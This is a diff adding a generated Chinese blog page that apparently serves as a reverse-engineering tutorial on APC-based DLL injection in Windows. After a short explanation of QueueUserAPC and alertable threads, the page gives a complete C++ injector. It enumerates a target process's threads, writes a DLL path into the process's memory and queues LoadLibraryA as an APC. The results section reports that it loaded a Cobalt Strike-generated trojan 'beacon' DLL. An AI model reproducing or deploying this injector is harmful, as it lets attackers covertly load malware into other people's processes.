@@ -1,0 +1,677 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Aries.ico">
+  <link rel="icon" href="/img/Aries.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="YY">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="APC注入APC，全称为Asynchronous Procedure Call，即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。 MSDN说，要使用例如线程调用SignalObjectAndWait、WaitForSingleObjectE、WaitForMultipleObjectsEx、SleepEx等等这些函数才会触发。 使用QueueUserAPC函数插">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[逆向] dll注入--apc注入">
+<meta property="og:url" content="https://s1n9l3.github.io/2023/12/25/[%E9%80%86%E5%90%91]%20dll%E6%B3%A8%E5%85%A5--apc%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="S1n9l3">
+<meta property="og:description" content="APC注入APC，全称为Asynchronous Procedure Call，即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。 MSDN说，要使用例如线程调用SignalObjectAndWait、WaitForSingleObjectE、WaitForMultipleObjectsEx、SleepEx等等这些函数才会触发。 使用QueueUserAPC函数插">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20231225194100919.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20231225194314596.png">
+<meta property="article:published_time" content="2023-12-25T11:16:57.084Z">
+<meta property="article:modified_time" content="2023-12-25T11:43:14.880Z">
+<meta property="article:author" content="YY">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="dll注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20231225194100919.png">
+  
+  
+  
+  <title>[逆向] dll注入--apc注入 - S1n9l3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"s1n9l3.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>WXYY</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/post.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="[逆向] dll注入--apc注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-25 19:16" pubdate>
+          2023年12月25日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[逆向] dll注入--apc注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h1><p>APC，全称为Asynchronous Procedure Call，即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。</p>
+<p>MSDN说，要使用例如线程调用<code>SignalObjectAndWait</code>、<code>WaitForSingleObjectE</code>、<code>WaitForMultipleObjectsEx</code>、<code>SleepEx</code>等等这些函数才会触发。</p>
+<p>使用<code>QueueUserAPC</code>函数插入APC函数，<code>QueueUserAPC</code>内部调用的是<code>NtQueueApcThread</code>，再内部是<code>KiUserApcDispatcher</code>。<br>攻击者可以将恶意代码作为一个APC函数插入APC队列（调用<code>QueueUserAPC</code>或<code>NtQueueApcThread</code>），而这段恶意代码一般实现加载DLL的操作，实现DLL注入。</p>
+<h2 id="核心函数"><a href="#核心函数" class="headerlink" title="核心函数"></a>核心函数</h2><p>主要涉及函数：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC 函数 (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></li>
+</ul>
+<h3 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h3><p>将用户模式 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/sync/asynchronous-procedure-calls">异步过程调用</a> (APC) 对象添加到指定线程的 APC 队列。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] PAPCFUNC  pfnAPC,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] HANDLE    hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] ULONG_PTR dwData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure>
+
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><code>[in] pfnAPC</code></p>
+<p>指向应用程序提供的 APC 函数的指针，该函数在指定线程执行可警报等待操作时调用。 有关详细信息，请参阅 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/nc-winnt-papcfunc">PAPCFUNC 回调函数</a>。</p>
+<p><code>[in] hThread</code></p>
+<p>线程的句柄。 句柄必须具有 <strong>THREAD_SET_CONTEXT</strong> 访问权限。 有关详细信息，请参阅 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/Sync/synchronization-object-security-and-access-rights">同步对象安全性和访问权限</a>。</p>
+<p><code>[in] dwData</code></p>
+<p>传递给 <em>pfnAPC</em> 参数指向的 APC 函数的单个值。</p>
+<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果该函数成功，则返回值为非零值。</p>
+<p>如果函数失败，则返回值为零。 要获得更多的错误信息，请调用 GetLastError。 <strong>Windows Server 2003 和 Windows XP：</strong> 没有为此函数定义可通过调用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a> 检索的错误值。</p>
+<h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>在 Windows系统中,每个线程都会维护一个线程 APC队列，通过<code>QucueUserAPC</code>把一个APC 函数添加到指定线程的APC队列中。每个线程都有自己的APC队列,这个 APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC 函数，对于用户模式下的APC 队列,当线程处在可警告状态时才会执行这些APC 函数。一个线程在内部使用<code>SignalObjectAndWait</code> 、 <code>SleepEx</code>、<code>WaitForSingleObjectEx</code>、<code>WaitForMultipleObjectsEx</code>等函数把自己挂起时就是进入可警告状态,此时便会执行APC队列函数。</p>
+<p>通俗点来概括过程可分为以下几步：</p>
+<ol>
+<li>当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。</li>
+<li>当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</li>
+<li>利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</li>
+</ol>
+<p>但是想要使用apc注入也有以下两点条件：</p>
+<ol>
+<li>必须是多线程环境下；</li>
+<li>注入的程序必须会调用那些同步对象；</li>
+</ol>
+<p>每一个进程的<strong>每一个线程都有自己的APC队列</strong>，我们可以使用<strong>QueueUserAPC</strong>函数把一个APC函数压入APC队列中。当处于用户模式的APC被压入到线程APC队列后，线程并不会立刻执行压入的APC函数，而是要等到线程处于<strong>可通知状态</strong>(alertable)才会执行，即只有当一个线程内部调用<strong>SleepEx</strong>等上面说到的几个特定函数将自己处于<strong>挂起状态</strong>时，才会执行APC队列函数，执行顺序与普通队列相同，<strong>先进先出（FIFO）</strong>，在整个执行过程中，线程并无任何异常举动，不容易被察觉，但<strong>缺点</strong>是对于<strong>单线程程序一般不存在挂起状态</strong>，所以APC注入对于这类程序没有明显效果。</p>
+<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowError</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* pszText)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> szError[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    ::<span class="hljs-built_in">wsprintf</span>(szError, <span class="hljs-string">&quot;%s Error[%d]\n&quot;</span>, pszText, ::<span class="hljs-built_in">GetLastError</span>());<br>    ::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szError, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK);<br>&#125;<br><br><span class="hljs-comment">//列出指定进程的所有线程</span><br><span class="hljs-function">BOOL <span class="hljs-title">GetProcessThreadList</span><span class="hljs-params">(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 申请空间</span><br>    DWORD dwThreadIdListLength = <span class="hljs-number">0</span>;<br>    DWORD dwThreadIdListMaxCount = <span class="hljs-number">2000</span>;<br>    LPDWORD pThreadIdList = <span class="hljs-literal">NULL</span>;<br>    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;<br><br>    pThreadIdList = (LPDWORD)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwThreadIdListMaxCount * <span class="hljs-built_in">sizeof</span>(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (pThreadIdList == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-built_in">RtlZeroMemory</span>(pThreadIdList, dwThreadIdListMaxCount * <span class="hljs-built_in">sizeof</span>(DWORD));<br><br>    THREADENTRY32 th32 = &#123; <span class="hljs-number">0</span> &#125;;<br><br>    <span class="hljs-comment">// 拍摄快照</span><br>    hThreadSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, th32ProcessID);<br><br>    <span class="hljs-keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE)<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 结构的大小</span><br>    th32.dwSize = <span class="hljs-built_in">sizeof</span>(THREADENTRY32);<br><br>    <span class="hljs-comment">//遍历所有THREADENTRY32结构, 按顺序填入数组</span><br><br>    BOOL bRet = <span class="hljs-built_in">Thread32First</span>(hThreadSnap, &amp;th32);<br>    <span class="hljs-keyword">while</span> (bRet)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (th32.th32OwnerProcessID == th32ProcessID)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;<br>        &#125;<br>        bRet = <span class="hljs-built_in">Thread32Next</span>(hThreadSnap, &amp;th32);<br>    &#125;<br><br>    *pThreadIdListLength = dwThreadIdListLength;<br>    *ppThreadIdList = pThreadIdList;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">APCInject</span><span class="hljs-params">(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 申请内存</span><br><br>    PVOID lpAddr = <span class="hljs-literal">NULL</span>;<br>    SIZE_T page_size = <span class="hljs-number">4096</span>;<br><br>    lpAddr = ::<span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">nullptr</span>, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-keyword">if</span> (lpAddr == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;VirtualAllocEx - Error\n\n&quot;</span>);<br>        <span class="hljs-built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">// 把Dll的路径复制到内存中</span><br>    <span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, lpAddr, wzDllFullPath, (<span class="hljs-built_in">strlen</span>(wzDllFullPath) + <span class="hljs-number">1</span>) * <span class="hljs-built_in">sizeof</span>(wzDllFullPath), <span class="hljs-literal">nullptr</span>))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;WriteProcessMemory - Error\n\n&quot;</span>);<br>        <span class="hljs-built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 获得LoadLibraryA的地址</span><br>    PVOID loadLibraryAddress = ::<span class="hljs-built_in">GetProcAddress</span>(::<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><br>    <span class="hljs-comment">// 遍历线程, 插入APC</span><br>    <span class="hljs-type">float</span> fail = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = dwThreadIdListLength - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>    &#123;<br>        <span class="hljs-comment">// 打开线程</span><br>        HANDLE hThread = ::<span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);<br>        <span class="hljs-keyword">if</span> (hThread)<br>        &#123;<br>            <span class="hljs-comment">// 插入APC</span><br>            <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))<br>            &#123;<br>                fail++;<br>            &#125;<br>            <span class="hljs-comment">// 关闭线程句柄</span><br>            ::<span class="hljs-built_in">CloseHandle</span>(hThread);<br>            hThread = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Total Thread: %d\n&quot;</span>, dwThreadIdListLength);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Total Failed: %d\n&quot;</span>, (<span class="hljs-type">int</span>)fail);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">int</span>)fail == <span class="hljs-number">0</span> || dwThreadIdListLength / fail &gt; <span class="hljs-number">0.5</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success to Inject APC\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> TRUE;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inject may be failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ULONG32 ulProcessID = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the Process ID:&quot;</span>);<br>    cin &gt;&gt; ulProcessID;<br>    CHAR wzDllFullPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    LPDWORD pThreadIdList = <span class="hljs-literal">NULL</span>;<br>    DWORD dwThreadIdListLength = <span class="hljs-number">0</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _WIN64</span><br>    <span class="hljs-built_in">strcpy_s</span>(wzDllFullPath, <span class="hljs-string">&quot;D:\\downloads\\beacon5.dll&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">// _WIN64</span></span><br>    <span class="hljs-built_in">strcpy_s</span>(wzDllFullPath, <span class="hljs-string">&quot;D:\\downloads\\beacon4.dll&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetProcessThreadList</span>(ulProcessID, &amp;pThreadIdList, &amp;dwThreadIdListLength))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Can not list the threads\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//打开句柄</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open Process\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">//注入</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">APCInject</span>(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to inject DLL\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>使用64位，32位有问题。</p>
+<p>木马DLL使用CobaltStrike生成。</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20231225194100919.png" srcset="/img/loading.gif" lazyload alt="image-20231225194100919"></p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20231225194314596.png" srcset="/img/loading.gif" lazyload alt="image-20231225194314596"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%80%86%E5%90%91/" class="category-chain-item">逆向</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/reverse/">#reverse</a>
+      
+        <a href="/tags/dll%E6%B3%A8%E5%85%A5/">#dll注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>[逆向] dll注入--apc注入</div>
+      <div>https://s1n9l3.github.io/2023/12/25/[逆向] dll注入--apc注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>YY</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
